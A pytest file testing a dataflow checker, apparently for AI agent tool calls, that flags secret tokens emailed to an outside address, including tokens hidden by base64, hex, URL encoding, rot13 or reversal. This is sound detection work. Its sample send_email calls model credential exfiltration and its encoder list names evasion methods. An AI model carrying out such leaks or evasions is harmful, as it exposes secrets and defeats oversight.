import base64
import codecs
from urllib.parse import quote

import pytest

from sentinel_verifier.config import load_rules
from sentinel_verifier.dataflow import analyze_dataflow


def test_secret_to_external_sink_plain():
    cfg = load_rules()
    secret = "TOKEN=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    r = analyze_dataflow(
        {"content": secret},
        {"tool": "send_email", "params": {"to": "x@outside.com", "body": secret}},
        cfg.secrets,
        cfg.sinks,
        cfg.encoding,
    )
    assert "SECRET_TO_EXTERNAL_SINK" in r.flags


@pytest.mark.parametrize(
    "encoder",
    [
        lambda s: base64.b64encode(s.encode()).decode(),
        lambda s: s.encode().hex(),
        quote,
        lambda s: codecs.encode(s, "rot_13"),
        lambda s: s[::-1],
    ],
    ids=["base64", "hex", "url", "rot13", "reversed"],
)
def test_secret_to_external_sink_every_supported_encoding(encoder):
    cfg = load_rules()
    raw = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    source = {"token": raw}
    body = encoder(raw)
    r = analyze_dataflow(
        source,
        {"tool": "send_email", "params": {"to": "x@outside.com", "body": body}},
        cfg.secrets,
        cfg.sinks,
        cfg.encoding,
    )
    assert "SECRET_TO_EXTERNAL_SINK" in r.flags


def test_internal_mail_not_external_leak():
    cfg = load_rules()
    raw = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    r = analyze_dataflow(
        {"token": raw},
        {"tool": "send_email", "params": {"to": "a@corp.local", "body": raw}},
        cfg.secrets,
        cfg.sinks,
        cfg.encoding,
    )
    assert "SECRET_TO_EXTERNAL_SINK" not in r.flags
